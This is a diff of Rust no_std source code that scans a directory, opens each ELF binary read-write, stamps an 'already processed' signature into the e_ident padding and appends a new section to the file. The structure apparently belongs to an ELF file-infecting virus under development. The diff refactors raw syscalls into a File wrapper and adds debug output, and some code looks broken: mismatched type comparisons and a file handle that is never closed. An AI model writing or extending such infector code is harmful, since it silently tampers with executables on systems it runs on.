@@ -218,83 +218,65 @@ fn process_directory_entries(fd: usize,
 fn process_file(fd: usize, dirent: &LinuxDirent64) {
     let name_len = dirent.d_name.iter()
         .position(|&c| c == 0).unwrap_or(256);
-    let file_fd = unsafe {
-        syscall3(
-            SYS_OPENAT, 
-            fd, 
-            dirent.d_name.as_ptr() as usize, 
-            O_RDWR
-        )
+
+    let file = match File::open(
+        &dirent.d_name[..name_len], O_RDWR) {
+        Ok(file) => file,
+        Err(e) => {
+            print_str(b"Error opening file: ");
+            print_isize(e);
+            print_str(b"\n");
+            return;
+        }
     };
 
-    if file_fd > isize::MAX as usize {
-        print_str(b"Error opening file. Error code: ");
-        print_isize(-(file_fd as isize));
-        print_str(b"\n");
-        return;
-    }
-
-    print_str(b"File opened successfully. FD: ");
-    print_usize(file_fd);
-    print_str(b"\n");
-
-    // Check the file size
-    let mut statbuf: MaybeUninit<LinuxStat> 
-        = MaybeUninit::uninit();
-
-    let fstat_result = unsafe {
-        syscall(
-            SYS_FSTAT,
-            file_fd,
-            statbuf.as_mut_ptr() as usize,
-            0
-        )
+    let file_size = match file.size() {
+        Ok(size) => size,
+        Err(e) => {
+            print_str(b"Error getting file size: ");
+            print_isize(e);
+            print_str(b"\n");
+            return;
+        }
     };
 
-    if fstat_result != 0 {
-        print_str(b"Error getting file status: ");
-        print_isize(-(fstat_result as isize));
-        print_str(b"\n");
-        unsafe { syscall1(SYS_CLOSE, file_fd); }
-        return;
-    }
-
-    let file_size = unsafe { 
-        (*statbuf.as_ptr()).st_size 
-    };
-
-    print_str(b"File size: ");
-    print_isize(file_size as isize);
-    print_str(b" bytes\n");
-
-    // No ELF should be less than 120 bytes
     if file_size < 120 {
         print_str(b"File too small to be an ELF\n");
-        unsafe { syscall1(SYS_CLOSE, file_fd); }
         return;
     }
-    
+
     let mut elf_header 
         = MaybeUninit::<ElfHeader>::uninit();
-
-    let mut bytes_read = unsafe {
-        syscall3(
-            SYS_READ, 
-            file_fd, 
-            elf_header.as_mut_ptr() as usize,
+    let elf_header_slice = unsafe {
+        core::slice::from_raw_parts_mut(
+            elf_header.as_mut_ptr() as *mut u8,
             core::mem::size_of::<ElfHeader>()
         )
     };
 
-    let mut header = unsafe { 
-        elf_header.assume_init_ref() 
-    };
+    match file.read(elf_header_slice) {
+        Ok(bytes_read) => {
+            if bytes_read != core::mem::size_of::<ElfHeader>() {
+                print_str(b"Failed to read complete ELF header. Bytes read: ");
+                print_usize(bytes_read);
+                print_str(b"\n");
+                return;
+            }
+        },
+        Err(e) => {
+            print_str(b"Error reading ELF header. Error code: ");
+            print_isize(e);
+            print_str(b"\n");
+            return;
+        }
+    }
 
-    if bytes_read == core::mem::size_of::<ElfHeader>()
-        && !is_elf_file(&header) 
-    {
-        return
-    } 
+    let header = unsafe { elf_header.assume_init_ref() };
+
+    if !is_elf_file(header) {
+        print_str(b"Not an ELF file\n");
+        return;
+    }
 
     print_str(b"ELF file found: ");
     print_str(&dirent.d_name[..name_len]);
@@ -302,32 +284,140 @@ fn process_file(fd: usize, dirent: &LinuxDirent64) {
 
     if is_file_processed(&header.e_ident[8..12]) {
         print_str(b"File already processed\n");
-        return
+        return;
     }
 
     let signature_bytes = SIGNATURE.to_le_bytes();
-
-    // Write the signature as a single 4-byte write
-    let bytes_written = unsafe {
-        syscall4(
-            SYS_PWRITE64,
-            file_fd,
-            signature_bytes.as_ptr() as usize,
-            4,
-            8 // Offset: start writing at byte 8 of e_ident
-        )
-    };
-
-    if bytes_written == 4 {
-        print_str(b"ELF header modified with signature\n");
-    } else {
-        print_str(b"Failed to write signature. Bytes written: ");
-        print_isize(bytes_written as isize);
+    match file.pwrite(&signature_bytes, 8) {
+        Ok(4) => print_str(b"ELF header modified with signature\n"),
+        Ok(n) => {
+            print_str(b"Failed to write full signature. Bytes written: ");
+            print_usize(n);
+            print_str(b"\n");
+        }
+        Err(e) => {
+            print_str(b"Error writing signature. Error code: ");
+            print_isize(e);
+            print_str(b"\n");
+        }
     }
 
-    add_section(file_fd, header);
+    // if add_section(&file, header) {
+    //     print_str(b"New section added successfully\n");
+    // } else {
+    //     print_str(b"Failed to add new section\n");
+    // }
 
-    unsafe { syscall1(SYS_CLOSE, file_fd); }
+    // let file_fd = unsafe {
+    //     syscall3(
+    //         SYS_OPENAT, 
+    //         fd, 
+    //         dirent.d_name.as_ptr() as usize, 
+    //         O_RDWR
+    //     )
+    // };
+
+    // if file_fd > isize::MAX as usize {
+    //     print_str(b"Error opening file. Error code: ");
+    //     print_isize(-(file_fd as isize));
+    //     print_str(b"\n");
+    //     return;
+    // }
+
+    // print_str(b"File opened successfully. FD: ");
+    // print_usize(file_fd);
+    // print_str(b"\n");
+
+    // // Check the file size
+    // let mut statbuf: MaybeUninit<LinuxStat> 
+    //     = MaybeUninit::uninit();
+
+    // let fstat_result = unsafe {
+    //     syscall(
+    //         SYS_FSTAT,
+    //         file_fd,
+    //         statbuf.as_mut_ptr() as usize,
+    //         0
+    //     )
+    // };
+
+    // if fstat_result != 0 {
+    //     print_str(b"Error getting file status: ");
+    //     print_isize(-(fstat_result as isize));
+    //     print_str(b"\n");
+    //     unsafe { syscall1(SYS_CLOSE, file_fd); }
+    //     return;
+    // }
+
+    // let file_size = unsafe { 
+    //     (*statbuf.as_ptr()).st_size 
+    // };
+
+    // print_str(b"File size: ");
+    // print_isize(file_size as isize);
+    // print_str(b" bytes\n");
+
+    // // No ELF should be less than 120 bytes
+    // if file_size < 120 {
+    //     print_str(b"File too small to be an ELF\n");
+    //     unsafe { syscall1(SYS_CLOSE, file_fd); }
+    //     return;
+    // }
+    
+    // let mut elf_header 
+    //     = MaybeUninit::<ElfHeader>::uninit();
+
+    // let mut bytes_read = unsafe {
+    //     syscall3(
+    //         SYS_READ, 
+    //         file_fd, 
+    //         elf_header.as_mut_ptr() as usize,
+    //         core::mem::size_of::<ElfHeader>()
+    //     )
+    // };
+
+    // let mut header = unsafe { 
+    //     elf_header.assume_init_ref() 
+    // };
+
+    // if bytes_read == core::mem::size_of::<ElfHeader>()
+    //     && !is_elf_file(&header) 
+    // {
+    //     return
+    // } 
+
+    // print_str(b"ELF file found: ");
+    // print_str(&dirent.d_name[..name_len]);
+    // print_str(b"\n");
+
+    // if is_file_processed(&header.e_ident[8..12]) {
+    //     print_str(b"File already processed\n");
+    //     return
+    // }
+
+    // let signature_bytes = SIGNATURE.to_le_bytes();
+
+    // // Write the signature as a single 4-byte write
+    // let bytes_written = unsafe {
+    //     syscall4(
+    //         SYS_PWRITE64,
+    //         file_fd,
+    //         signature_bytes.as_ptr() as usize,
+    //         4,
+    //         8 // Offset: start writing at byte 8 of e_ident
+    //     )
+    // };
+
+    // if bytes_written == 4 {
+    //     print_str(b"ELF header modified with signature\n");
+    // } else {
+    //     print_str(b"Failed to write signature. Bytes written: ");
+    //     print_isize(bytes_written as isize);
+    // }
+
+    // //add_section(file_fd, header);
+
+    // unsafe { syscall1(SYS_CLOSE, file_fd); }
 }
 
 fn get_file_size(fd: usize) -> usize
@@ -357,15 +447,29 @@ fn is_file_processed(padding: &[u8]) -> bool {
 }
 
 fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
+    print_str(b"1. Starting add_section\n");
     let shoff = elf_header.e_shoff;
     let shentsize = elf_header.e_shentsize as usize;
     let shnum = elf_header.e_shnum as usize;
 
+    print_str(b"Section header offset (shoff): ");
+    print_usize(shoff as usize);
+    print_str(b"\n");
+
+    print_str(b"Section header entry size (shentsize): ");
+    print_usize(shentsize);
+    print_str(b"\n");
+
+    print_str(b"Number of section headers (shnum): ");
+    print_usize(shnum);
+    print_str(b"\n");
+
     if shnum > MAX_SECTIONS {
+        print_str(b"2. Too many sections\n");
         return false;
     }
 
-    // 1. Read the section header table
+    print_str(b"3. Reading section header table\n");
     let mut section_headers: [MaybeUninit<Elf64_Shdr>; MAX_SECTIONS] = unsafe { MaybeUninit::uninit().assume_init() };
     
     for i in 0..shnum {
@@ -379,17 +483,27 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
             )
         };
         if bytes_read != shentsize as isize {
+            print_str(b"4. Failed to read section header\n");
+            print_str(b"Bytes read: ");
+            print_isize(bytes_read);
+            print_str(b"\n");
+            print_str(b"Expected bytes: ");
+            print_usize(shentsize);
+            print_str(b"\n");
+            print_str(b"Section index: ");
+            print_usize(i);
+            print_str(b"\n");
             return false;
         }
     }
 
-    // 2. Create a new section header
+    print_str(b"5. Creating new section header\n");
     let mut new_section = Elf64_Shdr {
-        sh_name: 0, // We'll update this later
-        sh_type: 1, // SHT_PROGBITS
+        sh_name: 0,
+        sh_type: 1,
         sh_flags: 0,
         sh_addr: 0,
-        sh_offset: 0, // We'll update this later
+        sh_offset: 0,
         sh_size: NEW_SECTION_DATA.len() as u64,
         sh_link: 0,
         sh_info: 0,
@@ -397,15 +511,16 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         sh_entsize: 0,
     };
 
-    // 3. Find space for the new section data (at the end of the file)
+    print_str(b"6. Getting file size\n");
     let mut statbuf = MaybeUninit::<LinuxStat>::uninit();
     if unsafe { syscall(SYS_FSTAT, file_fd, statbuf.as_mut_ptr() as usize, 0) } != 0 {
+        print_str(b"7. Failed to get file size\n");
         return false;
     }
     let file_size = unsafe { statbuf.assume_init().st_size as u64 };
     new_section.sh_offset = file_size;
 
-    // 4. Update the ELF header
+    print_str(b"8. Updating ELF header\n");
     let mut new_elf_header = ElfHeader {
         e_ident: elf_header.e_ident,
         e_type: elf_header.e_type,
@@ -423,7 +538,7 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         e_shstrndx: elf_header.e_shstrndx,
     };
     
-    // 5. Write the new section data
+    print_str(b"9. Writing new section data\n");
     let bytes_written = unsafe {
         syscall4(
             SYS_PWRITE64,
@@ -434,10 +549,11 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         )
     };
     if bytes_written != NEW_SECTION_DATA.len() as isize {
+        print_str(b"10. Failed to write new section data\n");
         return false;
     }
 
-    // 6. Update the section name string table
+    print_str(b"11. Updating section name string table\n");
     let shstrtab = unsafe { section_headers[elf_header.e_shstrndx as usize].assume_init_ref() };
     let mut strtab: [MaybeUninit<u8>; MAX_STRTAB_SIZE] = unsafe { MaybeUninit::uninit().assume_init() };
     let bytes_read = unsafe {
@@ -450,11 +566,13 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         )
     };
     if bytes_read != core::cmp::min(shstrtab.sh_size as isize, MAX_STRTAB_SIZE as isize) {
+        print_str(b"12. Failed to read string table\n");
         return false;
     }
     
     let new_name_offset = shstrtab.sh_size;
     if (new_name_offset as usize + NEW_SECTION_NAME.len()) > MAX_STRTAB_SIZE {
+        print_str(b"13. String table overflow\n");
         return false;
     }
     for (i, &byte) in NEW_SECTION_NAME.iter().enumerate() {
@@ -462,7 +580,7 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
     }
     new_section.sh_name = new_name_offset as u32;
 
-    // Write updated string table
+    print_str(b"14. Writing updated string table\n");
     let bytes_written = unsafe {
         syscall4(
             SYS_PWRITE64,
@@ -473,10 +591,11 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         )
     };
     if bytes_written != (new_name_offset as usize + NEW_SECTION_NAME.len()) as isize {
+        print_str(b"15. Failed to write updated string table\n");
         return false;
     }
 
-    // 7. Write the new section header
+    print_str(b"16. Writing new section header\n");
     let bytes_written = unsafe {
         syscall4(
             SYS_PWRITE64,
@@ -487,10 +606,11 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         )
     };
     if bytes_written != core::mem::size_of::<Elf64_Shdr>() as isize {
+        print_str(b"17. Failed to write new section header\n");
         return false;
     }
 
-    // 8. Write the updated ELF header
+    print_str(b"18. Writing updated ELF header\n");
     let bytes_written = unsafe {
         syscall4(
             SYS_PWRITE64,
@@ -501,9 +621,11 @@ fn add_section(file_fd: usize, elf_header: &ElfHeader) -> bool {
         )
     };
     if bytes_written != core::mem::size_of::<ElfHeader>() as isize {
+        print_str(b"19. Failed to write updated ELF header\n");
         return false;
     }
 
+    print_str(b"20. Add section completed successfully\n");
     true
 }
 
@@ -581,6 +703,118 @@ fn exit(code: usize) -> ! {
         syscall(SYS_EXIT, code, 0, 0);
     }
     loop {}
+}
+
+struct File {
+    fd: usize,
+}
+
+impl File {
+    fn open(path: &[u8], flags: usize) -> Result<Self, isize> {
+        let fd = unsafe {
+            syscall3(
+                SYS_OPENAT,
+                AT_FDCWD as usize,
+                path.as_ptr() as usize,
+                flags
+            )
+        };
+        
+        if fd > isize::MAX as usize {
+            let error = -(fd as isize);
+            print_str(b"Open error code: ");
+            print_isize(error);
+            print_str(b"\n");
+            Err(error)
+        } else {
+            Ok(File { fd })
+        }
+    }
+
+    fn read(&self, buf: &mut [u8]) -> Result<usize, isize> {
+        let bytes_read = unsafe {
+            syscall3(
+                SYS_READ,
+                self.fd,
+                buf.as_mut_ptr() as usize,
+                buf.len()
+            )
+        };
+        if bytes_read > isize::MAX as usize {
+            Err(-(bytes_read as isize))
+        } else {
+            Ok(bytes_read)
+        }
+    }
+
+    fn write(&self, buf: &[u8]) -> Result<usize, isize> {
+        let bytes_written = unsafe {
+            syscall3(
+                SYS_WRITE,
+                self.fd,
+                buf.as_ptr() as usize,
+                buf.len()
+            )
+        };
+        if bytes_written > isize::MAX as usize {
+            Err(-(bytes_written as isize))
+        } else {
+            Ok(bytes_written)
+        }
+    }
+
+    fn pwrite(&self, buf: &[u8], offset: usize) -> Result<usize, isize> {
+        let bytes_written = unsafe {
+            syscall4(
+                SYS_PWRITE64,
+                self.fd,
+                buf.as_ptr() as usize,
+                buf.len(),
+                offset
+            )
+        };
+        if bytes_written > isize::MAX {
+            Err(-(bytes_written as isize))
+        } else {
+            Ok(bytes_written as usize)
+        }
+    }
+
+    fn pread(&self, buf: &mut [u8], offset: usize) -> Result<usize, isize> {
+        let bytes_read = unsafe {
+            syscall4(
+                SYS_PREAD64,
+                self.fd,
+                buf.as_mut_ptr() as usize,
+                buf.len(),
+                offset
+            )
+        };
+        if bytes_read > isize::MAX {
+            Err(-(bytes_read as isize))
+        } else {
+            Ok(bytes_read as usize)
+        }
+    }
+
+    fn size(&self) -> Result<usize, isize> {
+        let mut statbuf = MaybeUninit::<LinuxStat>::uninit();
+        let result = unsafe { syscall(SYS_FSTAT, self.fd, statbuf.as_mut_ptr() as usize, 0) };
+        if result != 0 {
+            Err(-(result as isize))
+        } else {
+            Ok(unsafe { statbuf.assume_init().st_size as usize })
+        }
+    }
+
+    fn close(self) -> Result<(), isize> {
+        let result = unsafe { syscall1(SYS_CLOSE, self.fd) };
+        if result != 0 {
+            Err(-(result as isize))
+        } else {
+            Ok(())
+        }
+    }
 }
 
 fn print_isize(mut n: isize) {
